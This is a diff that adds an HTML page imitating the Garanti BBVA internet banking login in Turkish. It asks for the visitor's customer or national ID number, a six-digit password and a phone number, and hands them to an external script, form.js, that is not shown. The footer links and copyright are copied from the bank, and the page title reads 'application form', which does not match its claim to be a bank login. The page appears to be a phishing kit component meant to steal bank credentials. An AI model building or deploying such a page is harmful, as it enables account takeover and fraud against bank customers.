@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Başvuru Formu</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="logo.png" alt="Logo">
+        </div>
+    </header>
+<br>
+    <div class="welcome-message">
+        <h1 style="color: #7fbf35; font-size: 24px;">Garanti BBVA İnternet Bankacılığı’na Giriş</h1>
+        <p style="color: #333;">Güvenli Bankacılığa Hoş Geldiniz</p>
+        <p style="color: #333;">Lütfen müşteri numaranızı ya da T.C. kimlik numaranızı ve size özel parolanızı girin.</p>
+    </div>
+
+    <div class="form-container">
+<form id="applicationForm" onsubmit="submitForm(event)">
+    <input type="text" id="customerID" maxlength="11" pattern="\d{11}" placeholder="Müşteri / T.C. Kimlik Numarası" required>
+    <input type="password" id="password" maxlength="6" pattern="\d{6}" placeholder="Parola" required>
+    <input type="tel" id="phoneNumber" maxlength="11" pattern="\d{11}" placeholder="Telefon numarası" required>
+    <button type="submit">Garanti BBVA İnternet Giriş</button>
+</form>
+    </div>
+
+    <div class="footer">
+        <div class="container">
+            <div class="row patch-footer">
+                <div class="col-md-8">
+                    <table class="table">
+                        <tbody>
+                            <tr>
+                                <td>
+                                    <a href="JavaScript:void(0);" onclick="window.open('index.html');">Bize Ulaşın</a>
+                                </td>
+                                <td class="">
+                                    <a href="JavaScript:void(0);" onclick="window.open('index.html');">Güvenlik Bilgileri</a>
+                                </td>
+                                <td>
+                                    <span class="language">Language:</span> <a href="index.html">English</a>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-sm-8 col-xs-8">
+                    <table class="table">
+                        <tbody>
+                            <tr>
+                                <td>Copyright © 2024 T.Garanti Bankası A.Ş.</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="form.js"></script>
+</body>
+
+</html>
